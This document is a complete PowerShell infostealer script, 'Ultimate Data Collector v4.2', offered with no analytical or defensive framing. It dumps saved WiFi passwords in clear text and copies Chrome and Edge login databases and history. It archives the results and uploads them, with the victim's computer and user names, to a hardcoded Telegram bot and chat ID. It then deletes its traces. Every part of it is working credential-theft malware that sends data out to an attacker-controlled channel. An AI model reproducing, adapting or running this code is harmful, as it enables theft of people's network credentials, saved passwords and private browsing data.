<#
.SYNOPSIS
    Ultimate Data Collector v4.2
.DESCRIPTION
    Collects WiFi passwords and browser data
#>

# Telegram configuration
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ 
        chat_id = $CHAT_ID
        text = $Text
    }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15
    } catch { 
        Start-Sleep -Seconds 3
        try { Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15 } catch {}
    }
}

function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { 
        Start-Sleep -Seconds 3
        try { Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body } catch {}
    }
}

# WiFi passwords collection
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.txt"
    $result = @("=== WiFi Passwords ===")
    
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $_.Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
                netsh wlan export profile name="`"$profile`"" key=clear folder="$TEMP_DIR" | Out-Null
                
                if (Test-Path $xmlFile) {
                    $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
                    $result += "SSID: $profile"
                    $result += "Password: $password"
                    $result += "----------------"
                }
            } catch {
                $result += "Error with profile: $profile"
            }
        }
    } catch {
        $result += "WiFi module error: $_"
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# Browser data collection
function Get-BrowserData {
    $outputFile = "$TEMP_DIR\browser_data.txt"
    $result = @("=== Browser Data ===")
    
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\" }
    )
    
    foreach ($browser in $browsers) {
        try {
            if (Test-Path $browser.Path) {
                $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
                New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
                
                $loginFile = Join-Path $browser.Path "Login Data"
                if (Test-Path $loginFile) {
                    Copy-Item $loginFile "$browserDir\LoginData" -Force
                    $result += "$($browser.Name): Login Data copied"
                }
                
                $historyFile = Join-Path $browser.Path "History"
                if (Test-Path $historyFile) {
                    Copy-Item $historyFile "$browserDir\History" -Force
                    $result += "$($browser.Name): History copied"
                }
            }
        } catch {
            $result += "$($browser.Name) error: $_"
        }
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# Main collection
try {
    Send-ToTelegram -Text "Data collection started on $env:COMPUTERNAME ($env:USERNAME)"
    
    $wifiFile = Get-WiFiPasswords
    $browserFile = Get-BrowserData
    
    $zipFile = "$env:TEMP\Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    Compress-Archive -Path @($wifiFile, $browserFile) -DestinationPath $zipFile -Force
    
    Send-FileToTelegram -FilePath $zipFile
    Send-ToTelegram -Text "Data collection completed. Archive: $(Split-Path $zipFile -Leaf)"
}
catch {
    Send-ToTelegram -Text "Error during data collection: $_"
}
finally {
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}
